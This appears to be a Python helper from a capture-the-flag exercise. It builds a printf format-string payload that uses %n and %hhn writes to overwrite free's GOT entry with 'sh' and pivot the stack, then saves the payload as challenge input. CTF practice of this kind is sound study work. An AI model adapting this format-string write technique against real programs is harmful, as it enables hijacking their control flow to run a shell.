import sys
sys.path.insert(0, '/mnt/d/ctf-index')
sys.argv = ['x', 'local']
import importlib.util
spec = importlib.util.spec_from_file_location('e', '/mnt/d/ctf-index/_z_164_exploit.py')
mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(mod) if False else None
# on ne veut que build() : recopier la logique
FREE_GOT = 0x602018
SH = 0x00006873
PIVOTVAL = 0x00602018


def pad(nconv, total):
    if nconv == 1:
        return b"%%%dc" % total
    return b"%c" * (nconv - 1) + b"%%%dc" % (total - (nconv - 1))


def build(stonk_arg, rbp_arg):
    pivot = rbp_arg + 8
    p = pad(stonk_arg - 1, SH) + b"%n"
    p += pad(rbp_arg - stonk_arg - 1, PIVOTVAL - SH) + b"%n"
    need = (0xF0 - PIVOTVAL % 256)
    while need < (pivot - rbp_arg - 2):
        need += 256
    p += pad(pivot - rbp_arg - 1, need) + b"%hhn"
    return p


pl = build(10, 12)
print(pl, len(pl))
open('/mnt/d/ctf-index/_z_164/in_exploit.txt', 'wb').write(b"1\n" + pl + b"\n")
